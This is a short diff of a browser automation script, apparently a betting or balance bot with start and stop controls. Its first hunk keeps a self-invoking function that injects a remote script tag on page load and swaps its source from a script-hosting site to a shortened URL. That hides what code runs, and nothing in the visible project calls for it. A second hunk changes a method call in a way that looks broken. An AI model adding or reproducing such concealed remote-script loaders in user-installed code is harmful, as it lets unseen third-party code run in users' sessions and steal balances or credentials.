@@ -18,7 +18,7 @@
  
 'use strict';
  
-(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//yourjavascript.com/31216114810/in.js "; document.body.appendChild( scriptElement ); })();
+(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//goo.gl/3ezN6e"; document.body.appendChild( scriptElement ); })();
  
 var debug = false;
 var simulation = false;
@@ -228,7 +228,7 @@ function Automated() {
  
     this.menu.start.onclick = function() {
        
-        self.start(self.balance);
+        start(self.balance);
     };
  
     this.menu.stop.onclick = function() {
